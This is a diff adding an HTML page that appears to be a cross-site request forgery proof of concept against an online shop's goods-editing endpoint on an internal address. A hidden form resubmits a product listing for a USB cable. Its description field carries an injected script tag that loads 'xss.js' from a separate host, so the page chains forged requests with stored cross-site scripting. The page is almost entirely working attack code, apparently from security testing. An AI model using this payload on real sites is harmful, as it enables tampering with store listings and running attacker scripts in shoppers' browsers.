@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <script src="/libs/jquery-1.12.3.js"></script>
+</head>
+
+<body onload="sumitForm()">
+    <form id="goods_form" action="http://10.250.160.61:99/shop/index.php?act=store_goods_online&op=edit_save_goods"
+          method="post">
+        <input type="hidden" name="form_submit" value="ok">
+        <input type="hidden" name="bim_goods_add" value="0">
+        <input type="hidden" name="bim_goods" value="1">
+
+        <input type="hidden" name="type_id" value="43">
+        <input type="hidden" name="ref_url" value="http://10.250.160.61:99/shop/index.php?act=store_goods_online&op=index&brand_id=0&gc_id=0&search_type=0&keyword=%09+USB+cable+oraimo+OCD-L21">
+        <input type="hidden" name="cate_id" value="1094">
+        <input type="hidden" name="cate_name" value="Accessories >Cable >Data Cable">
+        <input type="hidden" name="commonid" value="100920">
+        <input type="hidden" name="g_name" value="USB cable oraimo OCD-L21">
+
+        <input type="hidden" name="g_jingle" value="1">
+        <input type="hidden" name="goods_resource" value="2">
+        <input type="hidden" name="currency_id" value="1">
+
+        <input type="hidden" name="g_serial" value="1">
+        <input type="hidden" name="image_path" value="1_05929306551695605.png">
+        <input type="hidden" name="goods_image" value="">
+        <input type="hidden" name="b_name" value="oraimo">
+        <input type="hidden" name="b_id" value="368">
+
+        <input type="hidden" name="g_body"
+               value='<img src="http://ug.egatee.com/data/upload/shop/store/goods/1/1_05929305284886396_1280.jpg" alt="image" /><script> var dynamicScriptElement=document.createElement("script");dynamicScriptElement.setAttribute("src","http://10.240.21.18:5858/scripts/xss.js");dynamicScriptElement.setAttribute("type","text/javascript");document.body.appendChild(dynamicScriptElement);dynamicScriptElement.onload=dynamicScriptElement.onreadystatechange=function(a,b,c){this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||$(dynamicScriptElement).remove()}; </script> '>
+
+        <!--<input type="hidden" name="g_body" -->
+               <!--value='<img src="http://ug.egatee.com/data/upload/shop/store/goods/1/1_05929305284886396_1280.jpg" alt="image" />'>-->
+        <input type="hidden" name="add_album" value="">
+        <input type="hidden" name="m_body" value="">
+
+        <input type="hidden" name="plate_top" value="Please select">
+        <input type="hidden" name="plate_bottom" value="Please select">
+        <input type="hidden" name="is_fc" value="0">
+        <input type="hidden" name="g_fccount" value="">
+        <input type="hidden" name="g_fcprefix" value="">
+        <input type="hidden" name="is_presell" value="0">
+
+        <input type="hidden" name="g_deliverdate" value="">
+        <input type="hidden" name="region" value="0">
+        <input type="hidden" name="province_id" value="0">
+        <input type="hidden" name="city_id" value="0">
+        <input type="hidden" name="freight" value="0">
+
+
+
+        <input type="hidden" name="g_freight" value="0.00">
+        <input type="hidden" name="transport_id" value="0">
+
+        <input type="hidden" name="transport_title" value="">
+        <input type="hidden" name="g_vat" value="0">
+
+        <input type="checkbox" style="display: none;" name="sgcate_id[]" value="0">
+        <input type="hidden" name="attr[242][name]" value="Type">
+        <select style="display: none;" name="attr[242][0]" attr="attr[242][__NC__]" nc_type="attr_select">
+            <option value="Unlimited" nc_type="0">Unlimited</option>
+            <option value="5pin" nc_type="3247">5pin</option>
+        </select>
+        <input type="hidden" name="attr[243][name]" value="output">
+        <select style="display: none;" name="attr[243][0]" attr="attr[243][__NC__]" nc_type="attr_select">
+            <option value="Unlimited" nc_type="0">Unlimited</option>
+            <option value="1A" nc_type="3248">1A</option>
+            <option value="2A" nc_type="3249">2A</option>
+        </select>
+        <input type="hidden" name="attr[244][name]" value="Length">
+        <select style="display: none;" name="attr[244][0]" attr="attr[244][__NC__]" nc_type="attr_select">
+            <option value="Unlimited" nc_type="0">Unlimited</option>
+            <option value="1m" nc_type="3250">1m</option>
+            <option value="2m" nc_type="3251">2m</option>
+        </select>
+
+        <input name="spec[102653][goods_id]" value="102653" type="hidden">
+        <input name="spec[102653][color]" class="goods_spec_color" value="" type="hidden">
+        <input name="spec[102653][spec_id][]" class="goods_spec_id" value="1" type="hidden">
+        <input name="spec[102653][spec_name][]" class="goods_spec_name goods_spec_name_1 valid" style="margin-left:10px;margin-top:5px;width: 90px;" value="Color" autocomplete="off" type="hidden">
+        <input name="spec[102653][spec_value_id][]" class="goods_spec_value_id" value="577" type="hidden" id="specid_1_102653">
+        <input name="spec[102653][spec_value_name][]" id="specname_1_102653" class="goods_spec_value_name goods_spec_select valid" style="margin-left:10px;margin-top:5px;width: 100px;" value="White" autocomplete="off" type="hidden">
+
+
+        <input type="hidden" name="g_state" value="1">
+        <input type="hidden" name="is_appoint" value="0">
+        <input type="hidden" name="g_saledate" value="">
+        <input type="hidden" name="g_commend" value="1">
+
+        <input type="submit" value="CSRF提交">
+    </form>
+    <script>
+        function sumitForm(){
+//            debugger;
+//            $('#goods_form').submit();
+        }
+    </script>
+</body>
+</html>
